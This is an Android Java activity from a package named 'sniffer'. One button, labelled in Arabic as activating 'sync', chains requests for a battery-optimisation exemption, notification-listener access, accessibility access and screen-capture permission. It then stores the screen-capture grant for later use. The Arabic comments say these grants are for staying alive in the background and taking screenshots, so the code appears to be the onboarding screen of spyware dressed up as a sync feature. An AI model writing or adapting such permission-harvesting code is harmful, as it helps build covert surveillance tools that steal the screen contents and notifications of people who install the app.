package com.v8.global.sniffer;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_MEDIA_PROJECTION = 100;
    private Button btn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(0xFF121212);

        btn = new Button(this);
        btn.setText("تفعيل المزامنة والبدء");
        btn.setOnClickListener(v -> {
            // 1. استثناء البطارية (للبقاء حياً)
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);

            // 2. صلاحية الإشعارات
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));

            // 3. صلاحية الوصول (للسكرين شوت)
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));

            // 4. صلاحية تسجيل الشاشة (للسكرين شوت الفعلي)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                MediaProjectionManager projectionManager = 
                    (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                startActivityForResult(
                    projectionManager.createScreenCaptureIntent(),
                    REQUEST_MEDIA_PROJECTION
                );
            }
        });

        layout.addView(btn);
        setContentView(layout);
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_MEDIA_PROJECTION) {
            if (resultCode == Activity.RESULT_OK) {
                // حفظ صلاحية تسجيل الشاشة
                getSharedPreferences("screen_capture", MODE_PRIVATE)
                    .edit()
                    .putInt("resultCode", resultCode)
                    .putString("data", data.toUri(0))
                    .apply();
                
                btn.setText("✅ تم التفعيل بنجاح");
            }
        }
    }
}
